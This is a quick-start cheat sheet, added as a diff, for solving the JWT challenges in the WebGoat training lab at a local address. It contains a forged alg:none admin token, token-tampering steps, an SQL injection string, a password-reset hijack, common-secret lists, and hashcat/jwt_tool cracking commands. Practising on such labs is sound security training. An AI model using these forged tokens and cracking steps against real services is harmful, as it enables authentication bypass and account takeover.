@@ -1,0 +1,263 @@
+===============================================
+  JWT CHALLENGES - QUICK START
+===============================================
+
+TARGET: http://192.168.254.112:8001/WebGoat/JWT
+
+===============================================
+  STEP 1: OPEN TOOLS
+===============================================
+
+Open HTML Tool:
+  c:\webgoat-scripts-1\jwt_complete_toolkit.html
+
+Run PowerShell Script:
+  cd c:\webgoat-scripts-1
+  .\jwt_automation.ps1
+
+===============================================
+  STEP 2: CAPTURE YOUR JWT TOKEN
+===============================================
+
+1. Login to WebGoat
+2. Navigate to JWT challenge
+3. Open Browser DevTools (F12)
+4. Look for JWT in:
+   - Storage > Cookies
+   - Network > Headers > Authorization
+   - Application responses
+
+Example JWT:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkpvaG4ifQ.signature_here
+
+===============================================
+  QUICK ATTACKS (TRY IN ORDER)
+===============================================
+
+✅ CHALLENGE 1 PROVEN SOLUTION:
+------------------------------------
+1. F12 > Application > Cookies > http://192.168.254.112:8001
+2. Copy "access_token" value
+3. Double-click VALUE, Delete
+4. Paste: eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+5. Press Enter
+6. Click "Delete" button next to any user OR refresh
+
+IMPORTANT: Cookie is HttpOnly - CANNOT use JavaScript!
+Must edit manually in DevTools Application tab.
+
+PowerShell Method (for different timestamp):
+.\jwt_automation.ps1
+Choose option: 6
+Paste your token
+
+ATTACK 2: Change Username to Admin
+------------------------------------
+PowerShell: Option 3
+HTML: Token Tampering > "Change User ID"
+
+ATTACK 3: Algorithm "none"
+----------------------------
+PowerShell: Option 6
+HTML: Algorithm Confusion > "none" + Remove Signature
+
+ATTACK 4: Remove Signature
+----------------------------
+PowerShell: Option 7
+HTML: Algorithm Confusion > Remove Signature Only
+
+===============================================
+  TESTING YOUR TAMPERED TOKEN
+===============================================
+
+Method 1: Using Browser
+------------------------
+1. Open DevTools (F12)
+2. Go to Console
+3. Paste:
+   
+   fetch('http://192.168.254.112:8001/WebGoat/JWT/endpoint', {
+     method: 'GET',
+     headers: {
+       'Authorization': 'Bearer YOUR_TOKEN_HERE'
+     }
+   }).then(r => r.json()).then(console.log)
+
+Method 2: Using cURL
+---------------------
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/endpoint \
+  -H "Authorization: Bearer YOUR_TOKEN_HERE"
+
+Method 3: Using PowerShell Script
+-----------------------------------
+.\jwt_automation.ps1
+Choose option: 12
+Enter endpoint URL
+Paste token
+
+===============================================
+  COMMON JWT CHALLENGE SOLUTIONS
+===============================================
+
+CHALLENGE: "Become Admin" ✅ WORKING
+--------------------------
+1. F12 > Application > Cookies > http://192.168.254.112:8001
+2. Copy "access_token" value
+3. Double-click VALUE column, Delete old value
+4. Paste: eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+5. Press Enter
+6. Click "Delete" button next to any user OR refresh page
+7. Challenge solved!
+
+KEY POINTS:
+- Cookie is HttpOnly (cannot use document.cookie)
+- Must edit manually in DevTools Application > Cookies
+- Token must end with dot: ...payload.
+- Algorithm must be "none"
+
+PowerShell Alternative (for different timestamp):
+  Option 6 > Paste your current token > Use generated token
+
+CHALLENGE: "Buy Item for $0"
+-----------------------------
+1. Add item to cart (get JWT with price)
+2. Tamper: price: 100 → price: 0
+3. Submit order with tampered token
+
+PowerShell:
+  Option 11 > Enter "price" > Enter "0"
+
+CHALLENGE: "SQL Injection in JWT"
+-----------------------------------
+1. Get your JWT token
+2. Tamper username: user → admin' OR '1'='1
+3. Submit tampered token
+
+PowerShell:
+  Option 4
+
+CHALLENGE: "Reset Admin Password"
+-----------------------------------
+1. Request password reset for your account
+2. Capture reset JWT token
+3. Tamper: username: you → username: admin
+4. Submit reset with new password
+
+PowerShell:
+  Option 10 > Paste token > Enter "admin"
+
+CHALLENGE: "Crack JWT Secret"
+-------------------------------
+1. Get valid JWT token
+2. Brute force with common secrets
+3. Sign new token as admin
+
+PowerShell:
+  Option 8 > Paste token > Wait for crack
+  Option 9 > Enter payload > Enter found secret
+
+===============================================
+  COMMON WEBGOAT JWT SECRETS
+===============================================
+
+Try these secrets:
+- webgoat
+- secret  
+- password
+- 123456
+- admin
+- jwt
+- token
+
+===============================================
+  cURL COMMAND TEMPLATES
+===============================================
+
+GET Request with JWT:
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/[endpoint] \
+  -H "Authorization: Bearer [TOKEN]"
+
+POST Request with JWT:
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/[endpoint] \
+  -H "Authorization: Bearer [TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"key": "value"}'
+
+Password Reset:
+curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \
+  -H "Authorization: Bearer [TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "newpass123"}'
+
+===============================================
+  TROUBLESHOOTING
+===============================================
+
+Token Not Working?
+1. Check format: header.payload.signature (2 dots)
+2. Check Authorization header: "Bearer TOKEN"
+3. Try removing signature: header.payload.
+4. Try algorithm "none"
+
+PowerShell Script Not Running?
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
+
+HTML Tool Not Loading?
+- Right-click > Open with browser
+- Or double-click to open
+
+Can't Crack Secret?
+- Use external tools:
+  python jwt_tool.py TOKEN -C -d wordlist.txt
+  hashcat -m 16500 jwt.txt rockyou.txt
+
+===============================================
+  WORKFLOW FOR EACH CHALLENGE
+===============================================
+
+1. Read challenge description
+2. Capture JWT token
+3. Decode token (see what's inside)
+4. Try tampering attacks
+5. Try algorithm attacks
+6. If needed, brute force secret
+7. Submit tampered/crafted token
+8. Check result
+
+===============================================
+  EXTERNAL TOOLS (IF NEEDED)
+===============================================
+
+jwt_tool (Python):
+  git clone https://github.com/ticarpi/jwt_tool
+  python jwt_tool.py TOKEN -T
+
+jwt.io (Online):
+  https://jwt.io
+  Paste token, edit, copy result
+
+hashcat (Cracking):
+  hashcat -m 16500 jwt.txt wordlist.txt
+
+===============================================
+  TIPS FOR SUCCESS
+===============================================
+
+✓ Always decode token first to see structure
+✓ Try simple tampering before complex attacks
+✓ Keep track of which tokens work
+✓ Use browser DevTools to inspect requests
+✓ Check both GET and POST endpoints
+✓ Look for JWT in cookies, headers, and body
+✓ Try algorithm "none" if tampering fails
+✓ Common secrets: webgoat, secret, password
+
+===============================================
+  READY TO START!
+===============================================
+
+1. Open: jwt_complete_toolkit.html
+2. Run: .\jwt_automation.ps1
+3. Capture your JWT token from WebGoat
+4. Start with "Token Tampering" attacks
+5. Good luck! 🔐
